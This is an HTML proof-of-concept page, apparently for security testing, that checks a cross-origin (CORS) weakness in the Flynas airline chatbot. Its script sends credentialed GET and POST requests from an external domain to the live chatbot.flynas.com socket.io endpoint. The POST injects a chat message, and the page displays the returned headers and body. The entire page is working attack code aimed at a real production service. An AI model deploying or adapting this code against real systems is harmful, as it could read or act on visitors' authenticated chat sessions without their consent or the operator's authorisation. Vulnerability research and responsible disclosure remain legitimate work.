<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Flynas Chatbot CORS PoC</title>
  <style>
    body { background:#111; color:#eee; font-family: monospace; }
    input, button { padding:6px; margin:4px; }
    #response { white-space: pre-wrap; background:#000; padding:10px; border-radius:6px; }
  </style>
</head>
<body>
  <h2>Flynas Chatbot CORS PoC</h2>
  <p>Testing from external domain (GitHub Pages)</p>

  <input type="text" id="target" size="100" 
         value="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling">
  <br>
  <button onclick="testGET()">GET Test</button>
  <button onclick="testPOST()">POST Test</button>

  <h3>Response:</h3>
  <div id="response">No response yet...</div>

  <script>
    async function testGET(){
      const url = document.getElementById("target").value;
      try {
        const res = await fetch(url, {credentials:"include"});
        const text = await res.text();
        show(res, text);
      } catch(e){ document.getElementById("response").innerText = e; }
    }

    async function testPOST(){
      const url = document.getElementById("target").value;
      try {
        const res = await fetch(url, {
          method:"POST",
          credentials:"include",
          headers: {"Content-Type":"text/plain"},
          body: '42["message",{"text":"PoC External Domain Test"}]'
        });
        const text = await res.text();
        show(res, text);
      } catch(e){ document.getElementById("response").innerText = e; }
    }

    function show(res, body){
      document.getElementById("response").innerText =
        "Status: " + res.status + " " + res.statusText + "\n" +
        "URL: " + res.url + "\n" +
        "CORS: " + res.type + "\n" +
        "--- HEADERS ---\n" + [...res.headers].map(h=>h.join(": ")).join("\n") +
        "\n\n--- BODY ---\n" + body;
    }
  </script>
</body>
</html>
